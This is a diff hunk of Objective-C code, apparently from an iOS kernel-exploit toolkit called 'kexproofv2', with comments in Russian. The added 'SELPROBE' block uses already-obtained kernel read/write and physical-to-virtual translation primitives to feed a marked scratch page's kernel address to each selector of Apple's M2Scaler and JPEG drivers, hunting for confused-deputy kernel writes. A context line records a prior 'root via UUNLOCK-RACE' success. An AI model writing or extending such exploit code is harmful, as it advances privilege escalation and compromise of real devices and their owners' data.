@@ -8070,6 +8070,73 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                         if (fp) { fputs("root via UUNLOCK-RACE v3\n", fp); fclose(fp); }
                     }
                 }
+                // kexproofv2 2.0.27 [SELPROBE] — confused-deputy hunt. Каждому
+                // селектору M2Scaler/JPEGDriver скармливаем KVA НАШЕЙ scratch-
+                // страницы (маркер 0xA11C1000DEADBEEF) в struct и scalar.
+                // Если селектор пишет по юзер-указателю — маркер меняется ★.
+                // Единственный показанный ядру адрес — наша собственная страница.
+                {
+                    kpNote(r, @"  [SELPROBE] старт: аудит селекторов M2Scaler/JPEGDriver на запись по указателю");
+                    uint8_t *scratch = valloc(0x4000);
+                    uint64_t mkVA = 0, mkPA = 0;
+                    if (scratch) {
+                        memset(scratch, 0, 0x4000);
+                        for (int i = 0; i < 0x4000; i += 8) *(uint64_t *)(scratch + i) = 0xA11C1000DEADBEEFULL;
+                        mlock(scratch, 0x4000);
+                        mkPA = ttM ? vtophys(ttM, (uint64_t)scratch) : 0;
+                        mkVA = mkPA ? phystokv(mkPA) : 0;
+                        kpNote(r, [NSString stringWithFormat:@"  [SELPROBE] scratch userVA=%#llx PA=%#llx KVA=%#llx",
+                                  (unsigned long long)(uint64_t)scratch, (unsigned long long)mkPA, (unsigned long long)mkVA]);
+                    }
+                    if (mkVA && kpLooksLikeKernelPointer(mkVA)) {
+                        const char *svcs[2] = { "AppleM2ScalerCSCDriver", "AppleJPEGDriver" };
+                        for (int si = 0; si < 2; si++) {
+                            io_service_t s = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(svcs[si]));
+                            if (!s) { kpNote(r, [NSString stringWithFormat:@"  [SELPROBE] %@ не виден", svcs[si]]); continue; }
+                            io_connect_t sc = IO_OBJECT_NULL;
+                            kern_return_t ok = IOServiceOpen(s, mach_task_self(), 0, &sc);
+                            IOObjectRelease(s);
+                            if (ok != KERN_SUCCESS || !sc) {
+                                ok = IOServiceOpen(s, mach_task_self(), 1, &sc);
+                                if (ok != KERN_SUCCESS || !sc) { kpNote(r, [NSString stringWithFormat:@"  [SELPROBE] %@: open fail kr=0x%x", svcs[si], ok]); continue; }
+                            }
+                            kpNote(r, [NSString stringWithFormat:@"  [SELPROBE] %@: conn=0x%x — прогон селекторов 0..31", svcs[si], sc]);
+                            uint32_t hits = 0, accS = 0, accM = 0;
+                            for (uint32_t sel = 0; sel <= 31; sel++) {
+                                // struct-call: 512B, наш KVA в каждом qword-слоте
+                                uint8_t inB[512];
+                                for (int i = 0; i < 512; i += 8) *(uint64_t *)(inB + i) = mkVA;
+                                uint64_t oS[16] = {0}; size_t oC = 16;
+                                kern_return_t kr1 = IOConnectCallMethod(sc, sel, NULL, 0, inB, sizeof(inB), oS, &oC, NULL, NULL);
+                                if (kr1 == KERN_SUCCESS) accS++;
+                                uint64_t rd = early_kread64(mkVA + 0x100);
+                                if (rd != 0xA11C1000DEADBEEFULL) {
+                                    hits++;
+                                    kpNote(r, [NSString stringWithFormat:@"  [SELPROBE] ★★ sel=%u STRUCT пишет по указателю! было=0xA11C1000DEADBEEF стало=%#018llx kr=0x%x",
+                                              sel, (unsigned long long)rd, kr1]);
+                                    // вернуть маркер, продолжить охоту
+                                    early_kwrite64(mkVA + 0x100, 0xA11C1000DEADBEEFULL);
+                                }
+                                // scalar-call: 4 скаляра = KVA
+                                uint64_t sca[4] = { mkVA, mkVA, mkVA, mkVA };
+                                kern_return_t kr2 = IOConnectCallScalarMethod(sc, sel, sca, 4, NULL, NULL);
+                                if (kr2 == KERN_SUCCESS) accM++;
+                                rd = early_kread64(mkVA + 0x100);
+                                if (rd != 0xA11C1000DEADBEEFULL) {
+                                    hits++;
+                                    kpNote(r, [NSString stringWithFormat:@"  [SELPROBE] ★★ sel=%u SCALAR пишет по указателю! стало=%#018llx kr=0x%x",
+                                              sel, (unsigned long long)rd, kr2]);
+                                    early_kwrite64(mkVA + 0x100, 0xA11C1000DEADBEEFULL);
+                                }
+                            }
+                            kpNote(r, [NSString stringWithFormat:@"  [SELPROBE] %@ итог: селекторов с приёмом struct=%u scalar=%u, записей по указателю=%u",
+                                      svcs[si], accS, accM, hits]);
+                            IOServiceClose(sc);
+                        }
+                    }
+                    if (scratch) { munlock(scratch, 0x4000); free(scratch); }
+                    kpNote(r, @"  [SELPROBE] финиш");
+                }
                 // 1.9.273: PAPT-override в авто-цепи не установлен (EXP-03 живёт в
                 // кнопке дампа), а сток-точка на 18.6 = stub → kpZoneVtoP падал с 0.
                 // Контент-охота прямо здесь (р.63/69: zone-map покрыт резолвером
